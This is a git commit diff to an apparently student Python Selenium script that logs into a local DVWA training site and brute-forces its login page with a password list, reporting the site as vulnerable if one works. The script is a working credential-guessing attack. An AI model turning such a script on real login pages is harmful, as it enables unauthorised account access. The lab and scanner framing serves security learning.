75dbaef3268dacc4849025acfd4a9a95cf1556fc
Appleboyav0 <avior2060@gmail.com>
2024-02-04 02:49:50 +0200

    added comments for elad

--- BRUTE_FORCE/brute_force_feature.py
+++ BRUTE_FORCE/brute_force_feature.py
@@ -2,25 +2,22 @@ from selenium import webdriver
 from selenium.webdriver.support.ui import Select
 
 BASE_URL = "http://localhost/DVWA/login.php"
-
 username = 'admin'
 password = 'password'
-
 driver = webdriver.Chrome()
 driver.get(BASE_URL)
 
-
 ###################################PASS THE LOGIN PAGE#################################################
 # Find the username and password input fields on the login page using various locators
-username_field = driver.find_element('name', 'username')  
-password_field = driver.find_element('name', 'password') 
+username_field = driver.find_element('name', 'username')
+password_field = driver.find_element('name', 'password')
 
 # Enter the username and password into their respective fields
 username_field.send_keys(username)
 password_field.send_keys(password)
 
 # Find and click the login button
-login_button = driver.find_element('name', 'Login')  
+login_button = driver.find_element('name', 'Login')
 login_button.click()
 #######################################################################################################
 
@@ -29,7 +26,7 @@ login_button.click()
 # After logging in, navigate to the desired page
 driver.get("http://localhost/DVWA/security.php")
 
-select_element = driver.find_element('name', 'security') 
+select_element = driver.find_element('name', 'security')
 
 # Use the Select class to interact with the <select> element
 select = Select(select_element)
@@ -43,6 +40,8 @@ submit_button.click()
 
 
 ##########################GET PASSWORDS LIST FROM FILE#################################################
+# TODO: elad check if the below line will work
+# filename = "passwords.txt"
 filename = "C:\magshimim\site_scanner_project\BRUTE_FORCE\passwords.txt"
 password_list = []
 with open(filename, 'r') as file:
@@ -53,14 +52,14 @@ with open(filename, 'r') as file:
 #######################################################################################################
 
 ##########################TRY FIND THE PASSWORD########################################################
-fl=False
+fl = False
 for password in password_list:
     user = 'admin'
     driver.get(f"http://localhost/DVWA/vulnerabilities/brute/?username={user}&password={password}&Login=Login#")
     get_source = driver.page_source
     target_text = 'Welcome to the password protected area'
     if target_text in get_source:
-        fl=True
+        fl = True
         print("Your website is vulnerable to Brute Force attack!")
         print(f'User: {user}, Password: {password}')
         break
